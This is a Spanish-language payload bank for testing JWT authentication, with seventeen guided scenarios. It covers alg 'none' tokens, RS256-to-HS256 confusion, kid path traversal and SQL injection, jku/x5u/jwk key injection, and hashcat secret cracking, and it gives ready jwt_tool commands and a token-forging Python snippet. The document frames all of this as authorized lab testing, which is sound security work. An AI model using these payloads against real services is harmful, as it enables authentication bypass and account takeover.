# 🗡️ Ataques contra JWT: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Cabeceras alg y firma

```json
{"alg":"none","typ":"JWT"}
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
{"alg":"HS256","typ":"JWT"}
{"alg":"RS256","typ":"JWT"}
```

**Cuándo usarlo:** Modificar únicamente tokens propios y reconstruir sus tres segmentos. Las variantes none son válidas solo si el verificador acepta la ausencia de firma; un token rechazado es el resultado esperado.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/jwt).


### Claims de validación

```json
{"sub":"{USUARIO_PROPIO}","iss":"{EMISOR_ESPERADO}","aud":"{AUDIENCIA_ESPERADA}"}
{"sub":"{USUARIO_PROPIO}","iss":"{EMISOR_INCORRECTO}","aud":"{AUDIENCIA_ESPERADA}"}
{"sub":"{USUARIO_PROPIO}","iss":"{EMISOR_ESPERADO}","aud":"{AUDIENCIA_INCORRECTA}"}
{"sub":"{USUARIO_PROPIO}","exp":{EPOCH_EXPIRADO}}
{"sub":"{USUARIO_PROPIO}","nbf":{EPOCH_FUTURO}}
```

**Cuándo usarlo:** Estas son plantillas de payload, no JWT completos. Solo tokens firmados con claves de prueba permiten aislar la validación de claims; alterarlos sin firmar demuestra rechazo de firma, no de claims.

**Fuente:** [RFC](https://datatracker.ietf.org/doc/html/rfc8725).


## 🧭 Payloads por contexto

### Selección de clave por kid

```json
{"alg":"HS256","kid":"{ID_CLAVE_VALIDO}"}
{"alg":"HS256","kid":"{ID_CLAVE_DESCONOCIDO}"}
{"alg":"HS256","kid":"../{RUTA_CLAVE_CONTROLADA}"}
{"alg":"HS256","kid":"{ID_CLAVE_VALIDO}","typ":"JWT"}
```

**Cuándo usarlo:** Comparar selección de clave en un entorno autorizado. La ruta con ../ solo tiene sentido si kid se usa como ruta de archivo; no asumir que un kid arbitrario permite falsificación.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/jwt).


### Referencias remotas y clave embebida

```json
{"alg":"RS256","jku":"https://{DOMINIO_CONTROLADO}/jwks.json"}
{"alg":"RS256","jwk":{"kty":"RSA","kid":"{ID_CLAVE_CONTROLADA}","n":"{N_BASE64URL}","e":"AQAB"}}
{"alg":"RS256","x5u":"https://{DOMINIO_CONTROLADO}/cert.pem"}
{"alg":"RS256","kid":"{ID_CLAVE_CONTROLADA}"}
```

**Cuándo usarlo:** Usar una clave y dominio propios en laboratorio. La aceptación exige que el verificador confíe incorrectamente en jku/jwk/x5u o seleccione la clave equivocada; el callback por sí solo no demuestra aceptación.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/jwt).


## 🔥 Payloads avanzados

### Confusión de familia algorítmica

```text
Header esperado: {"alg":"RS256","typ":"JWT"}
Variante A:       {"alg":"HS256","typ":"JWT"}
Variante B:       {"alg":"HS384","typ":"JWT"}
Variante C:       {"alg":"HS512","typ":"JWT"}
Clave HMAC:       {CLAVE_PUBLICA_RSA_DEL_SERVIDOR}
```

**Cuándo usarlo:** Solo donde la aplicación usa RSA y expone la clave pública. El servidor vulnerable reutiliza indebidamente esa clave como secreto HMAC; requiere generar una firma válida sobre un token propio.

**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md).


### Tipo, emisor y audiencia entre servicios

```json
{"typ":"JWT","alg":"RS256","kid":"{KID_DEL_EMISOR_A}"}
{"typ":"at+jwt","alg":"RS256","kid":"{KID_DEL_EMISOR_A}"}
{"iss":"{EMISOR_A}","aud":"{API_A}","sub":"{USUARIO_PROPIO}"}
{"iss":"{EMISOR_A}","aud":"{API_B}","sub":"{USUARIO_PROPIO}"}
```

**Cuándo usarlo:** Solo comparar tokens emitidos legítimamente para servicios diferentes. Aceptar un token válido para otra audiencia o propósito es confusión de contexto, no ruptura criptográfica.

**Fuente:** [RFC](https://datatracker.ietf.org/doc/html/rfc8725).


## 🔬 Pruebas guiadas por escenario

### 1. Firma inválida como control

**Objetivo:** Cambiar un claim de un token propio manteniendo la firma original.

```http
GET /api/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {JWT_PROPIO_CLAIM_ALTERADO_FIRMA_ORIGINAL}
```

**Interpretación:** El servidor debe rechazarlo. Una respuesta idéntica a la válida exige comprobar que el claim modificado gobierna una decisión.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/jwt).

### 2. alg none

**Objetivo:** Crear un token sin firma para la identidad propia y comprobar rechazo.

```python
import base64, json
def b64(x): return base64.urlsafe_b64encode(json.dumps(x,separators=(',',':')).encode()).decode().rstrip('=')
header = {"alg":"none","typ":"JWT"}
claims = {"sub":"{ID_PROPIO}","iss":"{ISS}","aud":"{AUD}"}
print(b64(header)+"."+b64(claims)+".")
```

**Interpretación:** La tercera parte vacía conserva el punto final. Un 200 genérico no prueba aceptación del token.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/jwt).

### 3. Confusión RS256→HS256

**Objetivo:** En laboratorio con clave pública propia, verificar que el servidor fija el algoritmo esperado.

```bash
python3 jwt_tool.py '{JWT_PROPIO_RS256}' -X k -pk publickey.pem
```

**Interpretación:** La firma HS256 hecha con la clave pública solo debería aceptarse si existe confusión de algoritmos; conservar clave pública exacta.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md).

### 4. kid como ruta de clave

**Objetivo:** En laboratorio, probar si kid selecciona un archivo conocido como clave HMAC.

```bash
python3 jwt_tool.py '{JWT_PROPIO}' -I -hc kid -hv '../../dev/null' -S hs256 -p ''
```

**Interpretación:** El ejemplo depende de la ruta real y del verificador. Una respuesta distinta no prueba firma válida; confirmar con recurso propio.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md).

### 5. JWK embebida

**Objetivo:** Comprobar si el verificador acepta una clave pública incluida dentro del token.

```json
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","kid":"{KID_PROPIO}","n":"{MODULO_PUBLICO_PROPIO}","e":"AQAB"}}
```

**Interpretación:** Este header se firma con la privada correspondiente en laboratorio. El servidor debe usar su almacén de claves confiables.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/jwt).

### 6. jku hacia JWKS controlado

**Objetivo:** Probar si se busca una JWKS aportada por el token en un host propio.

```json
{"alg":"RS256","typ":"JWT","kid":"{KID_PROPIO}","jku":"https://{CONTROLLED_HOST}/jwks.json"}
```

**Interpretación:** La callback demuestra fetch, no bypass. Para validar aceptación, la JWKS y firma de laboratorio deben coincidir.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/jwt).

### 7. Secreto HS256 débil

**Objetivo:** Probar offline una lista pequeña de secretos de laboratorio contra un JWT propio.

```bash
hashcat -m 16500 jwt-propio.txt candidatos-lab.txt --quiet
```

**Interpretación:** No enviar tokens a servicios externos. Confirmar algoritmo HS256, coincidencia de firma y vigencia de la clave.

**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/JSON%20Web%20Token/README.md).

### 8. Claims temporales y de contexto

**Objetivo:** Comparar rechazo de un token propio ya vencido, conservando el resto de claims válidos.

```json
{"sub":"{ID_PROPIO}","iss":"{ISS_ESPERADO}","aud":"{AUD_ESPERADA}","exp":1}
```

**Interpretación:** Requiere firma válida de laboratorio y control vigente equivalente; un 401 puede deberse a otras condiciones si no se aíslan.

**Fuente técnica:** [RFC](https://datatracker.ietf.org/doc/html/rfc8725).

### 9. Uso antes de nbf

**Objetivo:** Firmar en laboratorio un JWT propio cuyo nbf esté en el futuro.

```json
{"sub":"{ID_PROPIO}","iss":"{ISS_ESPERADO}","aud":"{AUD_ESPERADA}","nbf":4102444800}
```

**Interpretación:** Conservar iss, aud y firma válidos para aislar nbf. El servidor debe rechazarlo antes del instante indicado.

**Fuente técnica:** [RFC](https://datatracker.ietf.org/doc/html/rfc7519#section-4.1.5).

### 10. Confusión entre tipos de token

**Objetivo:** Probar si una API acepta como access token un ID token propio emitido para el mismo cliente.

```http
GET /api/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {ID_TOKEN_PROPIO_NO_ACCESS_TOKEN}
```

**Interpretación:** El ID token puede estar bien firmado y aun así tener público/propósito incorrecto. Confirmar rechazo y no registrar el token.

**Fuente técnica:** [RFC](https://datatracker.ietf.org/doc/html/rfc8725).

### 11. jku con autoridad ambigua

**Objetivo:** Evaluar validación por prefijo de host de JWKS, solo con dominio y clave de laboratorio.

```json
{"alg":"RS256","kid":"{KID_PROPIO}","jku":"https://{HOST_JWKS_CONFIABLE}@{CONTROLLED_HOST}/jwks.json"}
```

**Interpretación:** El host real de esta URL es CONTROLLED_HOST. Fetch externo no equivale a aceptación: verificar firma y acceso con recurso propio.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/jwt).

### 12. kid como consulta a base de datos

**Objetivo:** Solo si el verificador busca claves por kid en SQL, usar una comilla de prueba en el selector.

```json
{"alg":"HS256","typ":"JWT","kid":"{KID_VALIDO}'"}
```

**Interpretación:** Un error SQL o diferencia de respuesta es una pista de inyección, no aceptación de firma; aislar el parámetro en laboratorio.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/jwt).

### 13. Cadena x5c embebida

**Objetivo:** Firmar con clave propia de laboratorio y adjuntar su certificado autofirmado en x5c.

```json
{"alg":"RS256","typ":"JWT","kid":"{KID_PROPIO}","x5c":["{CERT_DER_BASE64_PROPIO}"]}
```

**Interpretación:** El servidor debe usar certificados confiables configurados, no confiar en el material incluido por el token.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/jwt).

### 14. x5u hacia certificado controlado

**Objetivo:** En laboratorio, comprobar si el header puede señalar un certificado remoto propio.

```json
{"alg":"RS256","typ":"JWT","kid":"{KID_PROPIO}","x5u":"https://{CONTROLLED_HOST}/jwt-cert.pem"}
```

**Interpretación:** Una petición al host solo prueba lectura remota. El bypass exige firma válida con esa clave y aceptación de una identidad propia.

**Fuente técnica:** [RFC](https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.5).

### 15. Issuer de otra confianza

**Objetivo:** Enviar a API A un JWT propio firmado válidamente por el emisor B de laboratorio.

```http
GET /api/me HTTP/1.1
Host: {RECURSO_A}
Authorization: Bearer {JWT_PROPIO_DE_ISSUER_B}
```

**Interpretación:** A debe validar iss contra su emisor esperado y asociar la clave a ese emisor; firma válida por B no basta.

**Fuente técnica:** [RFC](https://datatracker.ietf.org/doc/html/rfc8725#section-3.8).

### 16. Audiencia de otro recurso

**Objetivo:** Usar en recurso B un JWT propio emitido únicamente para recurso A.

```http
GET /api/me HTTP/1.1
Host: {RECURSO_B}
Authorization: Bearer {JWT_PROPIO_AUD_A}
```

**Interpretación:** Conservar firma, iss y vigencia correctos para aislar aud. B debe rechazar un token que no le está destinado.

**Fuente técnica:** [RFC](https://datatracker.ietf.org/doc/html/rfc8725#section-3.9).

### 17. Header crit no reconocido

**Objetivo:** Con firma propia válida de laboratorio, incluir una extensión crítica no entendida por el verificador.

```json
{"alg":"HS256","typ":"JWT","crit":["lab-flag"],"lab-flag":true}
```

**Interpretación:** El receptor debe rechazar o procesar explícitamente lab-flag; ignorarla violaría la semántica de crit.

**Fuente técnica:** [RFC](https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.11).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
